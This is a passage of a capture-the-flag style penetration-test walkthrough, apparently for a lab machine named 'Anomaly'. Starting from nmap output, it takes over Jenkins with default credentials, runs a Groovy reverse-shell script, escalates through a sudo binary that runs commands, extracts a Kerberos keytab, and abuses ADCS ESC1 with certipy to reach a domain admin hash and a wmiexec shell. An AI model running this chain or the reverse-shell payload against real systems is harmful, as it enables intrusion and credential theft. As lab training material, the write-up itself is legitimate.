| m/SJaMAHS580EwEDH0LywUMVJjBolZulBE2kDcC0bw37AukX1HTc4r1bd5lgjwyu
| oWNcqUVH+mqA8NvNwpDefgJDEsDx9kC0mPx5Q8DokxHYURQuH0FDb5XCetEXTVmo
| qJVaYKbPOrdNuQblIWDEEf+MpEwKhAG8g23hn/jAufy50ahkcUxDjnHvN22PwHs4
| HVlT3n1k0QIDAQABo4IDWjCCA1YwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkA
| bgBDAG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEF
| BQcDATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0D
| AgICAIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0w
| CwYJYIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAd
| BgNVHQ4EFgQU9eyvwJgx/LmwWxXiupvm41Ca3I0wHwYDVR0jBBgwFoAUSxx1utyZ
| SUgBUCc9j7sAqbA80EEwgdgGA1UdHwSB0DCBzTCByqCBx6CBxIaBwWxkYXA6Ly8v
| Q049YW5vbWFseS1BTk9NQUxZLURDLUNBLTIsQ049QW5vbWFseS1EQyxDTj1DRFAs
| Q049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmln
| dXJhdGlvbixEQz1hbm9tYWx5LERDPWhzbT9jZXJ0aWZpY2F0ZVJldm9jYXRpb25M
| aXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgckGCCsG
| AQUFBwEBBIG8MIG5MIG2BggrBgEFBQcwAoaBqWxkYXA6Ly8vQ049YW5vbWFseS1B
| Tk9NQUxZLURDLUNBLTIsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9YW5vbWFseSxEQz1oc20/
| Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
| b3JpdHkwQgYDVR0RBDswOaAfBgkrBgEEAYI3GQGgEgQQ2h9G/HoggUulVjkhSzV/
| 4oIWQW5vbWFseS1EQy5hbm9tYWx5LmhzbTBPBgkrBgEEAYI3GQIEQjBAoD4GCisG
| AQQBgjcZAgGgMAQuUy0xLTUtMjEtMTQ5Njk2NjM2Mi0zMzIwOTYxMzMzLTQwNDQ5
| MTg5ODAtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEARRqdwM6Rha2xgQ/N/+JxwJax
| gIceINwSDTIITwNI3QB8k0QX+6oPx3JG9oAoNEVBvEbqMl9ooOTvr5u7bMqAYx44
| Rq5EELmjEJZbQYLKVAZOw60kWPJo8x1gz8nDKYT8l2XTKUjiLabKwZFgtxcDs6Xh
| QZrgx5i8uLHkN1Cpoq7ueDhchHH54oUo+IvpVkBazd5SAzN/7Tk9y5hOAbPDa1w2
| JlhjT7LDe4cONBhTlZlTk8DReJrDpNSmjfV8ooRtm3S8O6d0XTyD5g9J93TRp4yT
| MpdSNV6skrldX8GFNOy6eVbsDWAR/MUUfbTdEzsg4UwV5rk77o6TAElLZZ/0OA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server syn-ack ttl 126
| rdp-ntlm-info: 
|   Target_Name: ANOMALY
|   NetBIOS_Domain_Name: ANOMALY
|   NetBIOS_Computer_Name: ANOMALY-DC
|   DNS_Domain_Name: anomaly.hsm
|   DNS_Computer_Name: Anomaly-DC.anomaly.hsm
|   DNS_Tree_Name: anomaly.hsm
|   Product_Version: 10.0.26100
|_  System_Time: 2025-12-12T16:55:32+00:00
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Issuer: commonName=Anomaly-DC.anomaly.hsm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-20T11:54:59
| Not valid after:  2026-03-22T11:54:59
| MD5:   115d:4b59:a71f:3664:48c0:b4cb:9c65:ce8a
| SHA-1: 8771:7928:b499:d5d2:0830:2da6:ca2b:275b:cb53:6e8f
| -----BEGIN CERTIFICATE-----
| MIIC8DCCAdigAwIBAgIQUg9f7dIcxZREjNiAiITCjTANBgkqhkiG9w0BAQsFADAh
| MR8wHQYDVQQDExZBbm9tYWx5LURDLmFub21hbHkuaHNtMB4XDTI1MDkyMDExNTQ1
| OVoXDTI2MDMyMjExNTQ1OVowITEfMB0GA1UEAxMWQW5vbWFseS1EQy5hbm9tYWx5
| LmhzbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOaCzXY06Ctr8ljX
| p+kZxDoVibTr+o68lfrA2wocRM03P/g3KG8AyP56661OUcbU47fbJ964oKVWrODt
| nWRQgHLePDLkcvl8wduXhHSBep6nK8qLaGobBBqUN/p7CQd17J6qUeCfUo72lnLm
| BI4sNjmNGhsitiYOTqMvF4B/7sue1OuBwrdEuyM7h0jj3/x1aDyMzaMTGHsW9FCO
| 6f743E1EUb6PQ6VAgEMgXM5wspZCKC7bNDboLYxbEkZ9hRN0IhjJ/InyFvY20Uu4
| feb/kbNNU4hzNeB0lja8OCj+FgIHJ9EXxIf/ZlWdIZeyq6YnJ2bZCY6ZSr3bb5TU
| al1HWLkCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQw
| MA0GCSqGSIb3DQEBCwUAA4IBAQCu4bey/oUJ8OvBtbxQGydNxLV1I19c1LWkJBeP
| DRH8sKo2N1wBe8KPzd1zRqdSIzcWvkPkMgNulOHybpOYrN56AcWpWewEfkFwW5aL
| WrK3cpu4bIyhnxPVoU575og8+SDvAobTuhDWIIzIGm0oqzclWP9BBG2sYkJdiJgY
| a0RGKDzWy4y2RnPxgtBQyna99y6LlBDH4rbqAVZYWOsJkqtUrnBLuEJyMXoRKP40
| 6R8L0apgKTPSOstss0Q+ycQ+PlmYAoNYSMZmwhpJlvnSdkhMBQLRBV7Kfb8ZbCLs
| +MggOo72qRdDLXiiJKxz63SzLzYMQmI7zNDt1ULhzBMpQWa2
|_-----END CERTIFICATE-----
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49708/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49743/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
58421/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.95%I=7%D=12/12%Time=693C48C7%P=x86_64-pc-linux-gnu%r(T
SF:erminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02
SF:\0\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=12/12%OT=53%CT=%CU=%PV=Y%DS=3%DC=T%G=N%TM=693C492B%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10C%TI=I%TS=A)
SEQ(SP=106%GCD=1%ISR=10A%TI=I%TS=A)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=N)

Uptime guess: 0.012 days (since Fri Dec 12 22:09:33 2025)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: ANOMALY-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-12T16:55:35
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 33667/tcp): CLEAN (Timeout)
|   Check 2 (port 52764/tcp): CLEAN (Timeout)
|   Check 3 (port 4340/udp): CLEAN (Timeout)
|   Check 4 (port 44868/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   200.10 ms 10.200.0.1
2   ...
3   217.33 ms 10.0.21.141

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:26
Completed NSE at 22:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:26
Completed NSE at 22:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:26
Completed NSE at 22:26, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.73 seconds
           Raw packets sent: 119 (9.544KB) | Rcvd: 574 (23.648KB)

```

## SSH (22)

```bash
ashu@kali ~ ssh root@10.0.29.163  
The authenticity of host '10.0.29.163 (10.0.29.163)' can't be established.
ED25519 key fingerprint is: SHA256:Dvt1peJRi+vluOpw5IPWTI8bbm2Sa3lgsolnhhuM/mk
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.29.163' (ED25519) to the list of known hosts.
root@10.0.29.163: Permission denied (publickey).
```

- SSH is using Key-Based Authentication. (This is good!)

## HTTP (8080)

### Dirsearch
```bash
nothing intresting
```
### Website Features
- Jenkins Instance 
- Login & Password
- We need creds!! 
### Access to Jenkins
```bash
admin:admin
```

# Initial Access to Ubuntu Server

- `http://10.0.29.163:8080/manage/script`

```js
String host="target-ip";
int port=8044;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```bash
nc -lnvp 8044
listening on [any] 8044 ...
connect to [10.200.23.41] from (UNKNOWN) [10.0.29.163] 45602
/bin/bash -i
bash: cannot set terminal process group (7431): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@ip-10-0-29-163:~$ 
```

## Post-Compromise (Web Server)

```bash
jenkins@ip-10-0-29-163:~$ id
uid=111(jenkins) gid=113(jenkins) groups=113(jenkins)
```

- No interesting groups found.
- Let's try to escalate our priviledges

```bash
jenkins@ip-10-0-29-163:~$ sudo -l
sudo -l
Matching Defaults entries for jenkins on ip-10-0-29-163:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jenkins may run the following commands on ip-10-0-29-163:
    (ALL) NOPASSWD: /usr/bin/router_config
```

- `/usr/bin/router_config` this runs with sudo priviledges, let's try to find a vulnerability

```bash
jenkins@ip-10-0-29-163:~$ /usr/bin/router_config
/usr/bin/router_config
Welcome to Router Configuration Utility v1.2
Usage: /usr/bin/router_config <config_file>
```

- Running it shows it accepts a config file and configures it, let's try to execute os commands.

```bash
jenkins@ip-10-0-29-163:~$ sudo /usr/bin/router_config whoami
sudo /usr/bin/router_config whoami
Applying config from whoami
root
Welcome to Router Configuration Utility v1.2
Applying configuration...
Configuration applied successfully!
```

- As we can see it gave us output to the command. lets try to pop a shell.

```bash
jenkins@ip-10-0-29-163:~$ sudo /usr/bin/router_config 'bash -i'
sudo /usr/bin/router_config 'bash -i'
Applying config from bash -i
bash: cannot set terminal process group (7431): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-0-29-163:/var/lib/jenkins# 
```

We got the root shell.

I stabilized the shell 

# Pivoting from Web Server to DC

```bash
root@ip-10-0-29-163:~# ls /etc/krb5*
/etc/krb5.conf  /etc/krb5.keytab
```


> [!NOTE] What is a KeyTab File?
>A keytab file on Linux is a secure cryptographic file storing encrypted pairs of Kerberos principals (like users or services) and their long-term secret keys, allowing services and daemons to authenticate to Kerberos (KDC) without human password entry, enabling automated logins, service-to-service communication, and passwordless access for applications like web servers.


Looking at the Kerberos Configuration file
```bash
root@ip-10-0-29-163:~# cat /etc/krb5.conf

[libdefaults]

 default_realm = ANOMALY.HSM

 dns_lookup_realm = true

 dns_lookup_kdc = true



[realms]

 ANOMALY.HSM = {

  kdc = Anomaly-DC.anomaly.hsm

  admin_server = Anomaly-DC.anomaly.hsm

 }



[domain_realm]

 .anomaly.hsm = ANOMALY.HSM

 anomaly.hsm = ANOMALY.HSM
```

```bash
root@ip-10-0-29-163:~# cat /etc/krb5.keytab 
J
 ANOMALY.HSM
            Brandon_Boyd �uLR��D�F���+�qoW�&2\␦�N���R
```

### Working with keytab files

- https://github.com/sosdave/KeyTabExtract

```bash
ashu@kali ~ python keytabextract.py krb5.keytab 
[!] No RC4-HMAC located. Unable to extract NTLM hashes.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
[+] Keytab File successfully imported.
	REALM : ANOMALY.HSM
	SERVICE PRINCIPAL : Brandon_Boyd/
	AES-256 HASH : f9754c5288b844eb86054695b2c12b93716f57c41d26325c1a994e12bbbeff52
```

- To authenticate with this let's download and install `kinit`.

```bash
sudo aqt update && sudo apt install krb5-user -y
```

# Initial Access to the Domain Controller

```bash
ashu@kali ~ kinit -kt krb5.keytab Brandon_Boyd@ANOMALY.HSM

ashu@kali ~ klist                                         
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: Brandon_Boyd@ANOMALY.HSM

Valid starting     Expires            Service principal
12/12/25 23:53:04  13/12/25 09:53:04  krbtgt/ANOMALY.HSM@ANOMALY.HSM
	renew until 13/12/25 23:53:04
	
ashu@kali ~ export KRB5CCNAME=/tmp/krb5cc_1000
ashu@kali ~ nxc ldap anomaly.hsm -u brandon_boyd -k --use-kcache
LDAP        anomaly.hsm     389    ANOMALY-DC       [*] Windows 11 / Server 2025 Build 26100 (name:ANOMALY-DC) (domain:anomaly.hsm)
LDAP        anomaly.hsm     389    ANOMALY-DC       [+] anomaly.hsm\brandon_boyd from ccache
```

- Dumping users

```bash
nxc ldap anomaly.hsm -u brandon_boyd -k --use-kcache --users
LDAP        anomaly.hsm     389    ANOMALY-DC       [*] Windows 11 / Server 2025 Build 26100 (name:ANOMALY-DC) (domain:anomaly.hsm)
LDAP        anomaly.hsm     389    ANOMALY-DC       [+] anomaly.hsm\brandon_boyd from ccache 
LDAP        anomaly.hsm     389    ANOMALY-DC       [*] Enumerated 5 domain users: anomaly.hsm
LDAP        anomaly.hsm     389    ANOMALY-DC       -Username-                    -Last PW Set-       -BadPW-  -Description-                                 
LDAP        anomaly.hsm     389    ANOMALY-DC       Administrator                 2025-09-17 17:31:03 0        Built-in account for administering the computer/domain
LDAP        anomaly.hsm     389    ANOMALY-DC       Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        anomaly.hsm     389    ANOMALY-DC       krbtgt                        2025-09-21 17:24:56 0        Key Distribution Center Service Account       
LDAP        anomaly.hsm     389    ANOMALY-DC       Brandon_Boyd                  2025-11-13 02:00:05 0        3edc4rfv#EDC$RFV                              
LDAP        anomaly.hsm     389    ANOMALY-DC       anna_molly                    2025-11-13 01:59:16 0  
```

## Full Compromise of `Brandon_Boyd`

```bash
ashu@kali ~ nxc smb anomaly.hsm -u brandon_boyd -p '3edc4rfv#EDC$RFV' --shares
SMB         10.0.21.141     445    ANOMALY-DC       [*] Windows 11 / Server 2025 Build 26100 x64 (name:ANOMALY-DC) (domain:anomaly.hsm) (signing:True) (SMBv1:False)
SMB         10.0.21.141     445    ANOMALY-DC       [+] anomaly.hsm\brandon_boyd:3edc4rfv#EDC$RFV 
SMB         10.0.21.141     445    ANOMALY-DC       [*] Enumerated shares
SMB         10.0.21.141     445    ANOMALY-DC       Share           Permissions     Remark
SMB         10.0.21.141     445    ANOMALY-DC       -----           -----------     ------
SMB         10.0.21.141     445    ANOMALY-DC       ADMIN$                          Remote Admin
SMB         10.0.21.141     445    ANOMALY-DC       C$                              Default share
SMB         10.0.21.141     445    ANOMALY-DC       IPC$            READ            Remote IPC
SMB         10.0.21.141     445    ANOMALY-DC       NETLOGON        READ            Logon server share 
SMB         10.0.21.141     445    ANOMALY-DC       SYSVOL          READ            Logon server share 

```

## Analyzing Attack Paths w/ Bloodhound

```bash
ashu@kali ~ nxc ldap anomaly.hsm -u brandon_boyd -p '3edc4rfv#EDC$RFV' --bloodhound --collection All --dns-server 10.0.21.141
LDAP        10.0.21.141     389    ANOMALY-DC       [*] Windows 11 / Server 2025 Build 26100 (name:ANOMALY-DC) (domain:anomaly.hsm)
LDAP        10.0.21.141     389    ANOMALY-DC       [+] anomaly.hsm\brandon_boyd:3edc4rfv#EDC$RFV 
LDAP        10.0.21.141     389    ANOMALY-DC       Resolved collection methods: group, trusts, localadmin, rdp, container, dcom, acl, psremote, session, objectprops
LDAP        10.0.21.141     389    ANOMALY-DC       Done in 00M 42S
LDAP        10.0.21.141     389    ANOMALY-DC       Compressing output into /home/ashu/.nxc/logs/ANOMALY-DC_10.0.21.141_2025-12-13_000430_bloodhound.zip
```

### Domain Admins

```
Administrator
ANNA_MOLLY
```

## Enumerating ADCS Vulnerabities

```bash
ashu@kali ~ certipy-ad find -u 'brandon_boyd@anomaly.hsm' -p '3edc4rfv#EDC$RFV' -dc-ip 10.0.21.141 -text -enabled -hide-admins -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'anomaly-ANOMALY-DC-CA-2' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'anomaly-ANOMALY-DC-CA-2'
[*] Checking web enrollment for CA 'anomaly-ANOMALY-DC-CA-2' @ 'Anomaly-DC.anomaly.hsm'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20251213003015_Certipy.txt'
[*] Wrote text output to '20251213003015_Certipy.txt'

```

```bash
sudo cat 20251213003015_Certipy.txt                 
[sudo] password for ashu: 
Certificate Authorities
  0
    CA Name                             : anomaly-ANOMALY-DC-CA-2
    DNS Name                            : Anomaly-DC.anomaly.hsm
    Certificate Subject                 : CN=anomaly-ANOMALY-DC-CA-2, DC=anomaly, DC=hsm
    Certificate Serial Number           : 3F1A258E7CADC7AE4C54650883521D22
    Certificate Validity Start          : 2025-09-21 21:25:39+00:00
    Certificate Validity End            : 2124-09-21 21:35:38+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Access Rights
        Enroll                          : ANOMALY.HSM\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertAdmin
    Display Name                        : CertAdmin
    Certificate Authorities             : anomaly-ANOMALY-DC-CA-2
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 99 years
    Renewal Period                      : 650430 hours
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-09-21T17:57:59+00:00
    Template Last Modified              : 2025-09-21T17:58:00+00:00
    Permissions
      Object Control Permissions
        Full Control Principals         : ANOMALY.HSM\Domain Computers
        Write Owner Principals          : ANOMALY.HSM\Domain Computers
        Write Dacl Principals           : ANOMALY.HSM\Domain Computers
    [+] User Enrollable Principals      : ANOMALY.HSM\Domain Computers
    [+] User ACL Principals             : ANOMALY.HSM\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : User has dangerous permissions.

```
## Exploiting ESC1

- Adding a computer account we control

```bash
ashu@kali ~ impacket-addcomputer -computer-name 'HackSmarter$' -computer-pass 'Hacksmarter123!' -dc-host "10.0.21.141" -domain-netbios "anomaly.hsm" "anomaly.hsm"/"brandon_boyd":'3edc4rfv#EDC$RFV'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account HackSmarter$ with password Hacksmarter123!.

```

Exploiting the ADCS vuln with computer account.

```bash
certipy-ad account -u 'HackSmarter$@anomaly.hsm' -p 'Hacksmarter123!' -dc-ip '10.0.21.141' -user 'anna_molly' read
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'anna_molly':
    cn                                  : anna_molly
    distinguishedName                   : CN=anna_molly,CN=Users,DC=anomaly,DC=hsm
    name                                : anna_molly
    objectSid                           : S-1-5-21-1496966362-3320961333-4044918980-1105
    sAMAccountName                      : anna_molly
    userAccountControl                  : 66048
    whenCreated                         : 2025-09-21T12:22:31+00:00
    whenChanged                         : 2025-11-12T20:29:25+00:00

```

```bash
ashu@kali ~ certipy-ad req \
    -u 'HackSmarter$@anomaly.hsm' -p 'Hacksmarter123!' \
    -dc-ip '10.0.21.141' -target 'anomaly.hsm' \
    -ca 'anomaly-ANOMALY-DC-CA-2' -template 'CertAdmin' \
    -upn 'anna_molly@anomaly.hsm' -dns 10.0.21.141 -sid 'S-1-5-21-1496966362-3320961333-4044918980-1105'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with multiple identities
    UPN: 'anna_molly@anomaly.hsm'
    DNS Host Name: '10.0.21.141'
[*] Certificate object SID is 'S-1-5-21-1496966362-3320961333-4044918980-1105'
[*] Saving certificate and private key to 'anna_molly_10.pfx'
File 'anna_molly_10.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'anna_molly_10.pfx'
```

```bash
ashu@kali ~ certipy-ad auth -pfx 'anna_molly_10.pfx' -dc-ip 10.0.21.141
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'anna_molly@anomaly.hsm'
[*]     SAN DNS Host Name: '10.0.21.141'
[*]     SAN URL SID: 'S-1-5-21-1496966362-3320961333-4044918980-1105'
[*]     Security Extension SID: 'S-1-5-21-1496966362-3320961333-4044918980-1105'
[*] Found multiple identities in certificate
[*] Please select an identity:
    [0] UPN: 'anna_molly@anomaly.hsm' (anna_molly@anomaly.hsm)
    [1] DNS Host Name: '10.0.21.141' (10$@0.21.141)
> 0
[*] Using principal: 'anna_molly@anomaly.hsm'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'anna_molly.ccache'
[*] Wrote credential cache to 'anna_molly.ccache'
[*] Trying to retrieve NT hash for 'anna_molly'
[*] Got hash for 'anna_molly@anomaly.hsm': aad3b435b51404eeaad3b435b51404ee:be4bf3131851aee9a424c58e02879f6e
```


# Getting Shell Access

```bash
git clone https://github.com/ice-wzl/wmiexec2.git
cd wmiexec2/
python3 -m venv myenv 
source myenv/bin/activate
pip install -r requirements.txt
pip3 install setuptools
python3 wmiexec2.py 'anomaly.hsm/anna_molly'@anomaly.hsm -hashes 'aad3b435b51404eeaad3b435b51404ee:be4bf3131851aee9a424c58e02879f6e' 
/home/ashu/HackSmarter/Anomaly/wmiexec2/myenv/lib/python3.13/site-packages/impacket/version.py:10: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[*] Output Filename: \TEmp\{b0i-413c-5l4c-m9lo-9v1c-02rg-2r7}
[*] **Launching wmiexec2**
[*] Press help for extra shell commands
> 

```

